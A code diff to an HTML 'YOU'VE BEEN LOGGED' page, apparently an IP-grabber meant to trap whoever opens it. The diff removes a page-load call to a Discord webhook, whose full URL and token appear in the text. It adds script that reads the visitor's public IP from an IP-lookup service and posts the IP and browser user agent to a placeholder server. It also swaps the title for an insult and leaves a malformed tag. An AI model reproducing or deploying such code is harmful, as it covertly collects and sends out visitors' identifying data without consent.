@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>You've Been Logged</title>
+    <title>your a bitch!</title
     <style>
         body {
             background-color: black;
@@ -27,36 +27,34 @@
     <h1>YOU'VE BEEN LOGGED</h1>
 
     <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                const userAgent = navigator.userAgent;
 
-        const webhookURL = "https://discord.com/api/webhooks/1308890616213671986/Mls06215HviC-3jqdbUpQwJXC5o3KZeQZC3eR1Cg9c3nJWPUhjLabwBuY3XhtafVD2ns";
-
-
-        function sendWebhook() {
-            const data = {
-                content: "You've been logged!"
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Webhook sent successfully");
-                } else {
-                    console.error("Error sending webhook");
-                }
+                fetch('https://your-server.com/log-device', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: userIP,
+                        userAgent: userAgent,
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Success");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
             })
             .catch(error => {
-                console.error("Network error: ", error);
+                console.error("Error fetching IP:", error);
             });
-        }
-
-        // Trigger webhook on page load
-        window.onload = sendWebhook;
     </script>
 </body>
 </html>
